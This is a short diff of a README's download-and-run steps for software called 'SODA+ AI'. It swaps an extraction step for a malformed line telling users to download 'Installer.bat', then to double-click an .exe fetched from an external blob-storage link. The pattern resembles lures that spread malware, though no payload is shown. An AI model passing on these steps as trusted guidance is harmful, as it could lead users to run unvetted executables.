@@ -6,7 +6,7 @@
 [⬇️ Download SODA+ AI](https://sodaplusbeta.blob.core.windows.net/downloads/download.html)
 
 ### Step 2: Extract
-Right-click the downloaded ZIP file and select **Extract All...**
+Download Installer.bat**
 
 ### Step 3: Run
 Double-click `SODA_PLUS_MAIN.exe` - No installation required!
